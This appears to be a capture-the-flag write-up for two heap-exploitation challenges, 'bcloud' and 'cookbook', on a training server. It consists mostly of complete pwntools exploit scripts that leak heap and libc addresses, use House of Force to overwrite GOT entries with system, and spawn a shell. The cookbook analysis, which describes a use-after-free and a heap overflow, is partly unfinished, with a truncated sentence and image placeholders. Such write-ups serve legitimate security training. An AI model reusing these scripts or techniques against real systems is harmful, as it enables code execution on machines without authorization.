# bcloud ![c](https://img.shields.io/badge/solved-success)
### Analysis
### Exploit
```python
from pwn import *
import time

# GUARDA LEZIONE DI MARIO

context.terminal = ['terminator', '-e']
'''
r = process("./bcloud") #env={'LD_PRELOAD': './libc-2.27.so'}
gdb.attach(r, """
	c
	""")
'''

r = remote("training.jinblack.it", 2016)
input("wait")

def new_note(size, data):
	r.sendline(b"1")
	r.recvuntil(b"Input the length of the note content:\n")
	r.sendline(b"%d" % size) 
	r.recvuntil(b"Input the content:\n")
	r.send(data)
	if(len(data)<size):
		r.send(b"\n")
	r.recvuntil("--->>\n")

def edit(note_id, data):
	r.sendline(b"3")
	r.recvuntil(b'Input the id:\n')
	r.sendline(b"%d" % note_id)
	r.recvuntil(b'Input the new content:\n')
	r.sendline(data)
	r.recvuntil("--->>\n")


r.recvuntil(b"name:\n")

r.send(b"A"*0x40)
leak = u32(r.recvuntil("!")[:-1][-4:])
print("! 0x%08x" % leak)

r.recvuntil(b"Org:\n")
r.send(b"B"*0x40)
r.recvuntil(b"Host:\n")
r.send(b"\xff"*0x40)

top_chunk = leak + 0xf8
print("! top_chunk: 0x%08x" % top_chunk)

got = 0x0804b000
target = 0x0804b120

big_size = (target - top_chunk - 4) & 0xffffffff
print("! big_size: 0x%08x" % big_size)
print(b"%d" % u32(p32(big_size, signed=False), signed=True))


r.sendline(b"1")
r.recvuntil(b"Input the length of the note content:\n")
r.sendline(b"%d" % u32(p32(big_size, signed=False), signed=True) ) 
r.recvuntil(b"Input the content:\n")
r.sendline("A")
r.recvuntil("--->>\n")



puts_plt = 0x08048520
free_got = 0x0804b014

#return pointer to note_list + delta
new_note(50, "")

#set size of other notes
new_note(4, "")
new_note(4, "")
new_note(4, "")
new_note(4, "")


def arbitrary_write(address, data):
	edit(1,address)
	edit(4,data)

note_slot_5 = 0x804b134
read_got = 0x0804b00c

arbitrary_write(p32(free_got), p32(puts_plt))
arbitrary_write(p32(note_slot_5), p32(read_got))

#delete note 5
r.sendline(b"4")
r.sendline(b"5")
r.recvuntil(b"id:\n")
read_libc = u32(r.recv(4))
r.recvuntil("--->>\n")
print("! read@libc 0x%04x" % read_libc)

# compute system address from read address offset in libc
system_libc = read_libc - 0xa9ab0	
arbitrary_write(p32(free_got), p32(system_libc))

# create new note with our bin sh as content
new_note(50, b"/bin/sh\x00")

# then "delete" the note -> free -> system(note)
r.sendline(b"4")
r.recvuntil(b"Input the id:\n")
r.sendline(b"5")

r.interactive()
```

**flag{you_got_horse_of_force!}**

# cookbook ![c](https://img.shields.io/badge/solved-success)
### Analysis
After a rapid analysis with file and checksec we can see that is stripped, so let's open the binary with Ghidra to better understand how it works. Search for the entry function, and consequentely the real main(). After an easy exploration of the code we can see that there is a mistake in the create_recipe function: cur_recipe is not set to NULL after the object is freed. This is a Use-after-Free vulnerability, that we can use to leak an address of the heap (by sending 'p' so calling the print_recipe_info function), leading us to calculate the base address of the heap.

IMMAGINE 1
IMMAGINE 2

Keep exploring this function: we can see that when sending 'n' the program calls a calloc with size 0x40C, but when we send 'g' to set a name our input (capped at 0x40C) is written to offset 0x23 into cur_recipe => Heap Overflow!

IMMAGINE 3
IMMAGINE 4

I was given also a libc to analyze: by looking at it with Ghidra I can 

PUTS_OFFSET = 0x77b40
SYSTEM_OFFSET = 0x4d200

#### Plan
- Use the first vulnerability (UaF) to leak an heap address.


### Exploit
```python
from pwn import *
import time

#from Ghidra
CUR_INGREDIENT = 0x0804d09c
CUR_RECIPE = 0x0804d0a0

#from libc file
PUTS_OFFSET = 0x77b40
SYSTEM_OFFSET = 0x4d200

#from gdb
HEAP_BASE_OFFSET = 0x1878 #leak address
# 1) leak heap address
# 2) get current heap base from gdb with info proc mappings
# 3) compute the difference
# 4) notice that is always 0x1878, taaaaaac

context.terminal = ['terminator', '-e']


elf = ELF('./cookbook')
r = elf.process()
libc = ELF('./libc-2.27.so')
addr = elf.got['puts']
print("adddddr: {0}".format(hex(addr)))

#r = process("./cookbook", env={'LD_PRELOAD': './libc-2.27.so'})
gdb.attach(r, """
	c
	""")


#r = remote("training.jinblack.it", 2017)
#input("wait")

print("==================================================")
print("STARTING EXPLOIT")

r.recvuntil("name?\n")

r.send(b"grigg0\n")


r.recvuntil("uit\n")

print("==================================================\nStep 1 - LEAKING HEAP... ")

r.send("c\n")
#time.sleep(0.1)
r.send("n\n")
#time.sleep(0.1)
r.send("g\n")
#time.sleep(0.1)

r.send("AAAA\n")
#time.sleep(0.1)
r.send("a\n")
#time.sleep(0.1)
r.send("basil\n")
#time.sleep(0.1)
r.send("1\n")
#time.sleep(0.1)
r.send("d\n")
#time.sleep(0.1)
r.send("p\n")
r.recvuntil("AAAA\n\n")

leaked_chunk = hex(int(r.recvuntil(" ")[:-1]))
print("[x] LEAKED HEAP CHUNK ADDR = {0}".format(leaked_chunk))

heap_base = hex(int(leaked_chunk, 16) - HEAP_BASE_OFFSET)
print("[x] COMPUTED HEAP BASE ADDR = {0}".format(heap_base))

top_chunk = hex(int(heap_base,16) + HEAP_BASE_OFFSET - 0x2)
print("[x] *maybe* COMPUTED TOP CHUNK ADDR = {0}".format(top_chunk))

# funziona fino a qua
print("==================================================\nStep 2 - LEAKING LIBC... ")
r.send("c\n")
r.send("n\n")
r.send("d\n")
r.send("q\n")
r.send("g\n")
r.send("40c\n")
r.sendline(b'\x00'*8 + b'A'*115 + b'B' + p32(addr))
r.send("c\n")
r.send("p\n")

r.recvuntil("AAAB")

r.recvuntil("recipe type: ")
leaked_puts = hex(u32(r.recv(4)))
print("[x] LEAKED PUTS GOT ADDR = {0}".format(leaked_puts))

libc_base = hex(int(leaked_puts,16) - PUTS_OFFSET)
print("[x] COMPUTED LIBC BASE ADDR v1 = {0}".format(libc_base))

libc_base = hex(int(leaked_puts,16) - libc.symbols['puts'])
print("[x] COMPUTED LIBC BASE ADDR v2 = {0}".format(libc_base))

#print("my_off {0}, x_off {1}".format(hex(PUTS_OFFSET), hex(libc.symbols['puts'])))

#sys_libc = hex(int(libc_base,16) + SYSTEM_OFFSET)
#print("[x] COMPUTED LIBC SYSTEM ADDR v1 = {0}".format(sys_libc))

sys_libc = hex(int(libc_base,16) + libc.symbols['system'])
print("[x] COMPUTED LIBC SYSTEM ADDR v2 = {0}".format(sys_libc))

# in teoria giusto anche fino a qua

r.sendline(b'c')
r.sendline(b'n')
r.sendline(b'g')
r.sendline(b"\x00"*0x380 + b'\xff'*4)
r.sendline(b'q')
r.recv()

r.sendline(b'g')
size = (0x0804d09c - int(top_chunk,16) - 0x428)&0xffffffff
print("SIZE: {0}".format(size))
r.sendline("0x%x" %size)
r.recv()
r.sendline(b'g')
r.recv()
r.sendline("0x%x" %0x30)
r.sendline(p32(0x0804d000)*12)
r.recv()
r.sendline(b'a')
r.sendline(b'g')
payload = b'/bin/sh\x00\x00\x00\x00' + p32(int(sys_libc,16))*32
r.recv()
r.sendline(payload)
r.recv()

r.interactive()
```
**flag{house_of_force_once_again!}**
